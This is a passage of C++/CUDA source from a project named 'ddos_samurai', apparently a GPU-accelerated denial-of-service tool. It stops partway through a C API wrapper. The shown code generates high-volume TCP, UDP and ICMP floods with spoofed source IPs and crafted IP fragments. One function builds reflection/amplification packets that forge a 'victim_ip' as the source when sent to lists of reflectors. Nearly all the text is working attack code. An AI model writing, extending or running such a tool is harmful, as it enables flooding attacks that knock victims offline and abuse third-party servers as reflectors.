// This file is included by gpu_packet_cuda.cu after prerequisite fragments.
// When opened standalone by IDE analysis, pull required fragments here.
#include "../gpu_packet_cuda.hpp"
#ifndef SAMURAI_GPU_PACKET_CUDA_PREAMBLE_INCLUDED
#define SAMURAI_GPU_PACKET_CUDA_FRAGMENT_CHAIN 1
#include "preamble.cuh"
#include "kernels_l4.cuh"
#include "kernels_template_pool.cuh"
#include "kernels_fragment_amp.cuh"
#include "kernels_icmp_utils.cuh"
#undef SAMURAI_GPU_PACKET_CUDA_FRAGMENT_CHAIN
#endif

PacketResult generate_packets(
    int64_t count,
    const std::string& target_ip,
    int64_t target_port,
    const std::string& protocol,
    bool spoof_ip,
    const std::string& real_src_ip,
    int64_t tcp_flags,
    bool has_ethernet,
    int64_t window,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  std::string proto = protocol;
  std::transform(proto.begin(), proto.end(), proto.begin(), ::tolower);

  uint8_t proto_int = TCP_PROTOCOL;
  if (proto == "udp") {
    proto_int = UDP_PROTOCOL;
  } else if (proto == "icmp") {
    proto_int = ICMP_PROTOCOL;
  }

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t transport_len = 0;
  if (proto_int == TCP_PROTOCOL) {
    transport_len = TCP_HEADER_LEN_WITH_OPT;
  } else if (proto_int == UDP_PROTOCOL) {
    transport_len = UDP_HEADER_LEN;
  } else if (proto_int == ICMP_PROTOCOL) {
    transport_len = ICMP_HEADER_LEN;
  }

  int packet_size = static_cast<int>(eth_len + IP_HEADER_LEN + transport_len);
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);

  DeviceBuffer out;
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc generate_packets output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync generate_packets failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;
  int blocks = blocks_for_count(count);

  if (proto_int == TCP_PROTOCOL) {
    if (spoof_ip) {
      CUDA_KERNEL_LAUNCH(create_tcp_packets_kernel_spoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          tcp_flags,
          has_ethernet ? 1 : 0,
          window,
          rng_states,
          gateway_mac,
          spoof_base_ip,
          spoof_mask);
      safe_kernel_launch("create_tcp_packets_kernel_spoof", cudaPeekAtLastError(), stream, false);
    } else {
      CUDA_KERNEL_LAUNCH(create_tcp_packets_kernel_nospoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          real_src_ip_int,
          tcp_flags,
          has_ethernet ? 1 : 0,
          window,
          rng_states,
          gateway_mac);
      safe_kernel_launch("create_tcp_packets_kernel_nospoof", cudaPeekAtLastError(), stream, false);
    }
  } else if (proto_int == UDP_PROTOCOL) {
    if (spoof_ip) {
      CUDA_KERNEL_LAUNCH(create_udp_packets_kernel_spoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          has_ethernet ? 1 : 0,
          rng_states,
          gateway_mac,
          spoof_base_ip,
          spoof_mask);
      safe_kernel_launch("create_udp_packets_kernel_spoof", cudaPeekAtLastError(), stream, false);
    } else {
      CUDA_KERNEL_LAUNCH(create_udp_packets_kernel_nospoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          real_src_ip_int,
          has_ethernet ? 1 : 0,
          rng_states,
          gateway_mac);
      safe_kernel_launch("create_udp_packets_kernel_nospoof", cudaPeekAtLastError(), stream, false);
    }
  } else if (proto_int == ICMP_PROTOCOL) {
    CUDA_KERNEL_LAUNCH(create_icmp_packets_kernel, blocks, kThreadsPerBlock, stream,
        out.ptr,
        count,
        target_ip_int,
        real_src_ip_int,
        spoof_ip ? 1 : 0,
        has_ethernet ? 1 : 0,
        8,
        0,
        rng_states,
        gateway_mac,
        spoof_base_ip,
        spoof_mask,
        0);
    safe_kernel_launch("create_icmp_packets_kernel", cudaPeekAtLastError(), stream, false);
  } else {
    throw std::invalid_argument("GPU packet generation does not support protocol: " + protocol);
  }

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_packets_from_template(
    const std::vector<uint8_t>& template_bytes,
    int64_t count,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  int packet_size = static_cast<int>(template_bytes.size());
  TemplateAcquisition template_acq = acquire_template_gpu(template_bytes, packet_size, stream);
  uint8_t* template_gpu = template_acq.ptr;

  DeviceBuffer out;
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc template output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync template output failed");

  uint32_t real_src_ip_int = ip_to_int(real_src_ip);
  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(template_bytes.size(), TEMPLATE_CONST_MAX)) {
      if (update_gpu_constant_template(template_bytes.data(), template_bytes.size())) {
        use_constant = 1;
      } else {
        if (!g_warned_template_const_fallback.exchange(true)) {
          // one-time warning path kept for parity with python behavior
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(template_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      template_gpu,
      use_constant,
      count,
      packet_size,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("template_kernel", cudaPeekAtLastError(), stream, false);

  if (template_acq.temporary && template_acq.ptr) {
    cudaFree(template_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_packets_from_template_pool(
    const std::vector<std::vector<uint8_t>>& templates_bytes_list,
    int64_t count,
    const std::string& target_ip,
    const std::string& real_src_ip,
    bool spoof_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  if (templates_bytes_list.empty()) {
    return PacketResult{};
  }

  int64_t num_templates = templates_bytes_list.size();
  int packet_size = static_cast<int>(templates_bytes_list[0].size());
  for (size_t i = 0; i < templates_bytes_list.size(); ++i) {
    if (static_cast<int>(templates_bytes_list[i].size()) != packet_size) {
      throw std::invalid_argument("All templates must be same size. Mismatch at index " + std::to_string(i));
    }
  }

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = real_src_ip.empty() ? 0u : ip_to_int(real_src_ip);

  std::vector<uint8_t> flat_templates = to_bytes_flat(templates_bytes_list);
  TemplateAcquisition templates_acq = acquire_template_gpu(flat_templates, packet_size, stream);
  uint8_t* templates_gpu = templates_acq.ptr;

  DeviceBuffer out;
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc pool output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync pool output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(flat_templates.size(), POOL_CONST_MAX)) {
      if (update_gpu_constant_pool(flat_templates.data(), flat_templates.size())) {
        use_constant = 1;
      } else {
        if (!g_warned_pool_const_fallback.exchange(true)) {
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(pool_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      templates_gpu,
      static_cast<int64_t>(flat_templates.size()),
      use_constant,
      count,
      packet_size,
      num_templates,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      specific_src_port,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("pool_kernel", cudaPeekAtLastError(), stream, false);

  if (templates_acq.temporary && templates_acq.ptr) {
    cudaFree(templates_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_fragmented_packets(
    const std::vector<uint8_t>& payload_bytes,
    int64_t count,
    const std::string& target_ip,
    int64_t target_port,
    const std::string& protocol,
    bool spoof_ip,
    const std::string& real_src_ip,
    bool has_ethernet,
    int64_t frag1_size,
    int64_t frag2_size,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  std::string proto = protocol;
  std::transform(proto.begin(), proto.end(), proto.begin(), ::tolower);
  int64_t proto_int = (proto == "tcp") ? TCP_PROTOCOL : UDP_PROTOCOL;

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t trans_len = (proto_int == UDP_PROTOCOL) ? 8 : 20;
  int64_t min_frag1 = eth_len + IP_HEADER_LEN + trans_len;
  int64_t min_frag2 = eth_len + IP_HEADER_LEN;
  if (frag1_size < min_frag1 || frag2_size < min_frag2) {
    throw std::invalid_argument("Fragment sizes too small");
  }

  int64_t frag1_ip_payload_len = frag1_size - eth_len - IP_HEADER_LEN;
  if ((frag1_ip_payload_len % 8) != 0) {
    throw std::invalid_argument("frag1_size causes unaligned fragment payload");
  }

  DeviceArray<uint8_t> payload_gpu(payload_bytes, stream);
  int64_t payload_size = static_cast<int64_t>(payload_bytes.size());

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  size_t total_buf_size = static_cast<size_t>(count) * static_cast<size_t>(frag1_size + frag2_size);
  DeviceBuffer out;
  throw_if_cuda(cudaMalloc(&out.ptr, total_buf_size), "cudaMalloc fragmented output failed");
  out.size = total_buf_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_buf_size, stream), "cudaMemsetAsync fragmented output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(create_fragmented_packets_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      payload_gpu.ptr,
      count,
      target_ip_int,
      target_port,
      proto_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      frag1_size,
      frag2_size,
      payload_size,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("create_fragmented_packets_kernel", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), static_cast<int>(frag1_size + frag2_size)};
}

PacketResult generate_amplification_packets(
    const std::vector<uint8_t>& template_bytes,
    const std::vector<std::string>& reflectors_ips,
    const std::string& victim_ip,
    int64_t count,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac) {
  if (reflectors_ips.empty()) {
    throw std::invalid_argument("reflectors_ips must not be empty");
  }

  int packet_size = static_cast<int>(template_bytes.size());
  DeviceArray<uint8_t> template_gpu(template_bytes, stream);

  std::vector<uint32_t> reflectors;
  reflectors.reserve(reflectors_ips.size());
  for (const auto& ip : reflectors_ips) {
    reflectors.push_back(ip_to_int(ip));
  }
  DeviceArray<uint32_t> reflectors_gpu(reflectors, stream);

  uint32_t victim_ip_int = ip_to_int(victim_ip);
  int64_t num_reflectors = static_cast<int64_t>(reflectors_ips.size());

  DeviceBuffer out;
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc amplification output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync amplification output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;
  int blocks = blocks_for_count(count);

  CUDA_KERNEL_LAUNCH(amplification_kernel_v2, blocks, kThreadsPerBlock, stream,
      out.ptr,
      template_gpu.ptr,
      reflectors_gpu.ptr,
      victim_ip_int,
      count,
      packet_size,
      num_reflectors,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac);
  safe_kernel_launch("amplification_kernel_v2", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_stateful_packets(
    const std::vector<std::vector<uint8_t>>& templates_bytes_list,
    int64_t count,
    const std::string& target_ip,
    bool spoof_ip,
    const std::string& real_src_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    const std::vector<uint32_t>& seq_list,
    const std::vector<uint32_t>& ack_list,
    const std::vector<uint8_t>& state_list,
    const std::vector<uint32_t>& actual_lengths,
    const std::vector<uint16_t>& window_sizes,
    const std::vector<uint16_t>& mss_values,
    const std::vector<uint8_t>& ttls,
    bool force_global_fallback) {
  if (templates_bytes_list.empty()) {
    return PacketResult{};
  }

  int64_t num_templates = templates_bytes_list.size();
  int packet_size = static_cast<int>(templates_bytes_list[0].size());
  for (size_t i = 0; i < templates_bytes_list.size(); ++i) {
    if (static_cast<int>(templates_bytes_list[i].size()) != packet_size) {
      throw std::invalid_argument("All templates must be same size. Mismatch at index " + std::to_string(i));
    }
  }

  std::vector<uint8_t> flat_templates = to_bytes_flat(templates_bytes_list);
  TemplateAcquisition templates_acq = acquire_template_gpu(flat_templates, packet_size, stream);
  uint8_t* templates_gpu = templates_acq.ptr;

  DeviceBuffer out;
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc stateful output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync stateful output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  std::vector<uint32_t> seq = seq_list.empty() ? std::vector<uint32_t>(count, 0) : seq_list;
  std::vector<uint32_t> ack = ack_list.empty() ? std::vector<uint32_t>(count, 0) : ack_list;
  std::vector<uint8_t> state = state_list.empty() ? std::vector<uint8_t>(count, 0) : state_list;
  std::vector<uint32_t> lengths = actual_lengths.empty() ? std::vector<uint32_t>(num_templates, packet_size) : actual_lengths;
  std::vector<uint16_t> wins = window_sizes.empty() ? std::vector<uint16_t>(count, 0) : window_sizes;
  std::vector<uint16_t> msss = mss_values.empty() ? std::vector<uint16_t>(count, 0) : mss_values;
  std::vector<uint8_t> ttlv = ttls.empty() ? std::vector<uint8_t>(count, 0) : ttls;

  DeviceArray<uint32_t> d_seq(seq, stream);
  DeviceArray<uint32_t> d_ack(ack, stream);
  DeviceArray<uint8_t> d_state(state, stream);
  DeviceArray<uint32_t> d_lengths(lengths, stream);
  DeviceArray<uint16_t> d_win(wins, stream);
  DeviceArray<uint16_t> d_mss(msss, stream);
  DeviceArray<uint8_t> d_ttl(ttlv, stream);

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(flat_templates.size(), POOL_CONST_MAX)) {
      if (update_gpu_constant_pool(flat_templates.data(), flat_templates.size())) {
        use_constant = 1;
      } else {
        if (!g_warned_pool_const_stateful_fallback.exchange(true)) {
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(stateful_pool_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      templates_gpu,
      static_cast<int64_t>(flat_templates.size()),
      use_constant,
      count,
      packet_size,
      num_templates,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      specific_src_port,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask,
      d_seq.ptr,
      d_ack.ptr,
      d_state.ptr,
      d_lengths.ptr,
      d_win.ptr,
      d_mss.ptr,
      d_ttl.ptr);
  safe_kernel_launch("stateful_pool_kernel", cudaPeekAtLastError(), stream, false);

  if (templates_acq.temporary && templates_acq.ptr) {
    cudaFree(templates_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_icmp_packets(
    int64_t count,
    const std::string& target_ip,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    int64_t icmp_type,
    int64_t icmp_code,
    int64_t payload_size,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t icmp_len = ICMP_HEADER_LEN + payload_size;
  int packet_size = static_cast<int>(eth_len + IP_HEADER_LEN + icmp_len);

  DeviceBuffer out;
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  throw_if_cuda(cudaMalloc(&out.ptr, total_size), "cudaMalloc icmp output failed");
  out.size = total_size;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, total_size, stream), "cudaMemsetAsync icmp output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(create_icmp_packets_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      count,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      icmp_type,
      icmp_code,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask,
      payload_size);
  safe_kernel_launch("create_icmp_packets_kernel", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

BenchmarkResult benchmark_template_generation_paths(
    const std::vector<uint8_t>& template_bytes,
    int count,
    int iterations,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  if (iterations < 1) {
    throw std::invalid_argument("iterations must be >= 1");
  }

  cudaStream_t stream = nullptr;
  throw_if_cuda(cudaStreamCreateWithFlags(&stream, cudaStreamNonBlocking), "cudaStreamCreateWithFlags failed");

  auto run_path = [&](bool force_global) {
    generate_packets_from_template(
        template_bytes,
        std::max(1, std::min(count, 2048)),
        real_src_ip,
        spoof_ip,
        has_ethernet,
        stream,
        gateway_mac,
        spoof_subnet,
        force_global);
    throw_if_cuda(cudaStreamSynchronize(stream), "warmup sync failed");

    GenerationTelemetry before = get_generation_telemetry();

    double total_seconds = 0.0;
    for (int i = 0; i < iterations; ++i) {
      auto start = std::chrono::high_resolution_clock::now();
      PacketResult res = generate_packets_from_template(
          template_bytes,
          count,
          real_src_ip,
          spoof_ip,
          has_ethernet,
          stream,
          gateway_mac,
          spoof_subnet,
          force_global);
      throw_if_cuda(cudaStreamSynchronize(stream), "benchmark sync failed");
      auto stop = std::chrono::high_resolution_clock::now();
      total_seconds += std::chrono::duration<double>(stop - start).count();
      (void)res;
    }

    GenerationTelemetry after = get_generation_telemetry();
    return telemetry_delta_to_path(before, after, count, total_seconds, iterations);
  };

  GenerationTelemetry before_all = get_generation_telemetry();
  BenchmarkPathResult auto_result = run_path(false);
  BenchmarkPathResult global_result = run_path(true);
  GenerationTelemetry after_all = get_generation_telemetry();

  BenchmarkResult out;
  out.count = count;
  out.iterations = iterations;
  out.template_size = static_cast<int>(template_bytes.size());
  out.constant = auto_result;
  out.global = global_result;
  out.auto_path = auto_result;
  out.forced_global_fallback = global_result;

  out.generation_telemetry.gpu_template_h2d_copy_count =
      (after_all.gpu_template_h2d_copy_count >= before_all.gpu_template_h2d_copy_count)
          ? (after_all.gpu_template_h2d_copy_count - before_all.gpu_template_h2d_copy_count)
          : 0;
  out.generation_telemetry.gpu_template_h2d_copy_bytes =
      (after_all.gpu_template_h2d_copy_bytes >= before_all.gpu_template_h2d_copy_bytes)
          ? (after_all.gpu_template_h2d_copy_bytes - before_all.gpu_template_h2d_copy_bytes)
          : 0;
  out.generation_telemetry.gpu_rng_state_alloc_count =
      (after_all.gpu_rng_state_alloc_count >= before_all.gpu_rng_state_alloc_count)
          ? (after_all.gpu_rng_state_alloc_count - before_all.gpu_rng_state_alloc_count)
          : 0;
  out.generation_telemetry.gpu_rng_state_reuse_count =
      (after_all.gpu_rng_state_reuse_count >= before_all.gpu_rng_state_reuse_count)
          ? (after_all.gpu_rng_state_reuse_count - before_all.gpu_rng_state_reuse_count)
          : 0;
  out.generation_telemetry.gpu_template_cache_hit_count =
      (after_all.gpu_template_cache_hit_count >= before_all.gpu_template_cache_hit_count)
          ? (after_all.gpu_template_cache_hit_count - before_all.gpu_template_cache_hit_count)
          : 0;
  out.generation_telemetry.gpu_template_cache_miss_count =
      (after_all.gpu_template_cache_miss_count >= before_all.gpu_template_cache_miss_count)
          ? (after_all.gpu_template_cache_miss_count - before_all.gpu_template_cache_miss_count)
          : 0;

  cudaStreamDestroy(stream);
  return out;
}

void copy_device_buffer_to_host(
    void* dst,
    size_t dst_size,
    const DeviceBuffer& gpu_arr,
    cudaStream_t stream) {
  if (!dst || dst_size == 0 || !gpu_arr.valid()) {
    return;
  }
  if (dst_size < gpu_arr.size) {
    throw std::invalid_argument("destination buffer is smaller than device buffer");
  }
  if (stream) {
    throw_if_cuda(
        cudaMemcpyAsync(dst, gpu_arr.ptr, gpu_arr.size, cudaMemcpyDeviceToHost, stream),
        "cudaMemcpyAsync copy_device_buffer_to_host failed");
    throw_if_cuda(cudaStreamSynchronize(stream), "copy_device_buffer_to_host synchronize failed");
  } else {
    throw_if_cuda(
        cudaMemcpy(dst, gpu_arr.ptr, gpu_arr.size, cudaMemcpyDeviceToHost),
        "cudaMemcpy copy_device_buffer_to_host failed");
  }
  g_d2h_transfer_count.fetch_add(1);
  g_d2h_transfer_bytes.fetch_add(gpu_arr.size);
}

GPUPacketGenerator::GPUPacketGenerator(
    int max_batch_size,
    std::string real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    std::string spoof_subnet)
    : max_batch_size_(std::max(1, max_batch_size)),
      real_src_ip_(std::move(real_src_ip)),
      spoof_ip_(spoof_ip),
      has_ethernet_(has_ethernet),
      spoof_subnet_(std::move(spoof_subnet)) {}

std::vector<std::vector<uint8_t>> GPUPacketGenerator::generate_batch(
    const std::vector<uint8_t>& template_bytes,
    int batch_size,
    cudaStream_t stream,
    uint64_t gateway_mac) {
  int count = std::max(0, batch_size);
  if (count > max_batch_size_) {
    throw std::invalid_argument("batch_size exceeds max_batch_size");
  }

  PacketResult res = generate_packets_from_template(
      template_bytes,
      count,
      real_src_ip_,
      spoof_ip_,
      has_ethernet_,
      stream,
      gateway_mac,
      spoof_subnet_);

  std::vector<uint8_t> host = copy_gpu_to_host_pinned(res.packets_gpu, "generator_batch", stream, true);
  std::vector<std::vector<uint8_t>> out;
  out.reserve(count);
  for (int i = 0; i < count; ++i) {
    int start = i * res.packet_size;
    int end = start + res.packet_size;
    out.emplace_back(host.begin() + start, host.begin() + end);
  }
  return out;
}

}  // namespace ddos_samurai::gpu_packet_cuda

namespace {
thread_local std::string g_samurai_gpu_packet_last_error;

constexpr uint64_t kExportHostBufferMagic = 0x53414d5552414931ull;  // SAMURAI1

enum class ExportHostAllocKind : uint32_t {
  kMalloc = 1u,
  kCudaHost = 2u,
};

struct ExportHostBufferHeader {
  uint64_t magic = kExportHostBufferMagic;
  uint32_t alloc_kind = static_cast<uint32_t>(ExportHostAllocKind::kMalloc);
  uint32_t reserved = 0u;
  size_t size = 0u;
};

static int set_c_api_error(const std::string& msg) {
  g_samurai_gpu_packet_last_error = msg;
  return -1;
}

static int init_c_api_outputs(uint8_t** out_data, size_t* out_size, int* out_packet_size) {
  if (!out_data || !out_size || !out_packet_size) {
    return set_c_api_error("null output pointer");
  }
  *out_data = nullptr;
  *out_size = 0;
  *out_packet_size = 0;
  return 0;
}

static int export_packet_result(
    const ddos_samurai::gpu_packet_cuda::PacketResult& res,
    const char* key,
    cudaStream_t stream,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  (void)key;
  uint8_t* payload = nullptr;
  ExportHostBufferHeader* header = nullptr;
  try {
    if (res.packets_gpu.valid()) {
      const size_t total = sizeof(ExportHostBufferHeader) + res.packets_gpu.size;
      void* raw = nullptr;
      ExportHostAllocKind alloc_kind = ExportHostAllocKind::kCudaHost;
      cudaError_t alloc_rc = cudaHostAlloc(&raw, total, cudaHostAllocPortable);
      if (alloc_rc != cudaSuccess || !raw) {
        raw = std::malloc(total);
        alloc_kind = ExportHostAllocKind::kMalloc;
        if (!raw) {
          return set_c_api_error("host export allocation failed");
        }
      }

      header = static_cast<ExportHostBufferHeader*>(raw);
      header->magic = kExportHostBufferMagic;
      header->alloc_kind = static_cast<uint32_t>(alloc_kind);
      header->reserved = 0u;
      header->size = res.packets_gpu.size;
      payload = reinterpret_cast<uint8_t*>(header + 1);

      if (res.packets_gpu.size > 0) {
        ddos_samurai::gpu_packet_cuda::copy_device_buffer_to_host(
            payload,
            res.packets_gpu.size,
            res.packets_gpu,
            stream);
      }
    }
  } catch (const std::exception& e) {
    if (header) {
      if (static_cast<ExportHostAllocKind>(header->alloc_kind) == ExportHostAllocKind::kCudaHost) {
        cudaFreeHost(static_cast<void*>(header));
      } else {
        std::free(static_cast<void*>(header));
      }
    }
    return set_c_api_error(e.what());
  }
  *out_data = payload;
  *out_size = res.packets_gpu.size;
  *out_packet_size = res.packet_size;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

static cudaStream_t decode_stream_handle(uint64_t stream_handle) {
  return reinterpret_cast<cudaStream_t>(static_cast<uintptr_t>(stream_handle));
}

static std::vector<std::vector<uint8_t>> decode_flat_templates(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates) {
  if (packet_size < 0 || num_templates < 0) {
    throw std::invalid_argument("packet_size and num_templates must be >= 0");
  }
  const size_t ps = static_cast<size_t>(packet_size);
  const size_t nt = static_cast<size_t>(num_templates);
  if (nt == 0) {
    return {};
  }
  if (ps == 0) {
    throw std::invalid_argument("packet_size must be > 0 when num_templates > 0");
  }
  const size_t kMaxSize = static_cast<size_t>(-1);
  if (ps > (kMaxSize / nt)) {
    throw std::invalid_argument("templates size overflow");
  }
  const size_t expected = ps * nt;
  if (expected != templates_flat_len) {
    throw std::invalid_argument("templates_flat_len does not match packet_size*num_templates");
  }
  if (!templates_flat) {
    throw std::invalid_argument("templates_flat must not be null");
  }

  std::vector<std::vector<uint8_t>> out;
  out.reserve(nt);
  for (size_t i = 0; i < nt; ++i) {
    const size_t start = i * ps;
    out.emplace_back(templates_flat + start, templates_flat + start + ps);
  }
  return out;
}

template <typename T>
static std::vector<T> vector_from_c_array(const T* ptr, size_t len, const char* name) {
  if (len == 0) {
    return {};
  }
  if (!ptr) {
    throw std::invalid_argument(std::string(name ? name : "array") + " pointer is null");
  }
  return std::vector<T>(ptr, ptr + len);
}
}  // namespace

extern "C" int samurai_gpu_packet_generate_packets(
    int64_t count,
    const char* target_ip,
    int64_t target_port,
    const char* protocol,
    int spoof_ip,
    const char* real_src_ip,
    int64_t tcp_flags,
    int has_ethernet,
    int64_t window,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    const std::string proto = protocol ? std::string(protocol) : std::string("tcp");
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
